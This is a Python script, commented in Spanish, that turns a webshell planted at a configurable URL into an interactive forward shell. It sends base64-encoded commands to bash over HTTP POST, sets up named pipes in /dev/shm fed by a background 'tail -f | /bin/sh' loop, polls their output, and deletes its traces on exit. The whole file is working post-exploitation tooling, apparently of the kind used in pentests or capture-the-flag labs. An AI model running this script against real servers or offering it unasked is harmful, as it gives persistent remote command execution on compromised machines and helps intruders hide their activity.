#!/usr/bin/python3

import requests, time, threading, signal, sys
from base64 import b64encode
from random import randrange

def handle_exit(sig, frame):
    print("\n\n[!] Exiting...\n")
    send_cmd(remove_input_cmd)
    send_cmd(remove_output_cmd)
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, handle_exit)

# --- Configuración (modifica main_shell_url si hace falta) ---
main_shell_url = "http://localhost/cmd.php"     # <-- cambia si tu webshell está en otra URL
sess_id = randrange(1000, 9999)
remote_in = "/dev/shm/f4ke_%s.in" % sess_id
remote_out = "/dev/shm/f4ke_%s.out" % sess_id
remove_input_cmd = "/bin/rm -f %s" % remote_in
remove_output_cmd = "/bin/rm -f %s" % remote_out

# -----------------------------------------------------------
# Lector en background
# -----------------------------------------------------------
class OutputReader(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        clear_cmd = "echo '' > %s" % remote_out
        read_cmd = "/bin/cat %s" % remote_out

        while True:
            out = send_cmd(read_cmd)

            if out:
                send_cmd(clear_cmd)
                print(out)

            time.sleep(self.interval)

# -----------------------------------------------------------
# Funciones de comunicación
# -----------------------------------------------------------
def send_cmd(cmd):
    """Envía cmd (string) codificado en base64 al main_shell_url y retorna la respuesta."""
    payload = cmd.encode()
    enc = b64encode(payload).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d | bash' % enc
    }

    r = (requests.post(main_shell_url, data=post_data, timeout=5).text).strip()
    return r

def prepare_remote_shell():
    """Crea named pipes remotas y lanza tail -f | sh > stdout en background."""
    mk = "mkfifo %s 2>/dev/null || true; mkfifo %s 2>/dev/null || true; (tail -f %s | /bin/sh 2>&1 > %s) &" % (remote_in, remote_in, remote_in, remote_out)
    try:
        send_cmd(mk)
    except:
        pass
    return None

def write_remote(cmd):
    """Escribe comando en stdin remoto (redirigiendo a la FIFO)."""
    if not cmd.endswith("\n"):
        cmd = cmd + "\n"
    payload = cmd.encode()
    enc = b64encode(payload).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d > %s' % (enc, remote_in)
    }

    r = (requests.post(main_shell_url, data=post_data, timeout=5).text).strip()
    return r

def read_remote():
    """Lee todo el stdout remoto (no usada en el loop principal, pero útil)."""
    read_cmd = "/bin/cat %s" % remote_out
    return send_cmd(read_cmd)

# -----------------------------------------------------------
# Main
# -----------------------------------------------------------
if __name__ == '__main__':
    prepare_remote_shell()
    reader = OutputReader()

    try:
        while True:
            cmd_line = input("webshell:~$ ")
            write_remote(cmd_line + "\n")
            time.sleep(1.1)
    except KeyboardInterrupt:
        handle_exit(None, None)
